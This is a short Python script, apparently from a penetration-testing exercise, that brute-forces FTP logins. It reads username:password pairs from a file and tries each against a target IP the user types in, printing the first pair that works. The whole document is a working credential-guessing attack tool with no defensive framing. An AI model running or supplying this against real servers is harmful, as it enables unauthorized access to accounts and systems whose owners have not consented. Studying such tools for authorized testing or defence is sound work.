import ftplib
from termcolor import colored

def bruteLogin(hostname, passwdFile):
    try:
        pF = open(passwdFile, "r")
    except:
        print("[!!] File Doesnt Exist!")

    for line in pF.readlines():
        userName = line.split(':')[0]
        password = line.split(':')[1].strip('\n')
        print("[+] Trying: " + userName + "/" + password)
        try:
            ftp = ftplib.FTP(hostname)
            login = ftp.login(userName, password)
            print(colored("[+] Login Succed With: " + userName + "/" + password, "blue"))
            ftp.quit()
            return(userName, password)
        except:
            pass
    print(colored("[-] Password Not in List","red"))


host = input("[*] Enter Targets IP Address: ")
passwdFile = input("[*] Enter User/Password File Path: ")
bruteLogin(host, passwdFile)
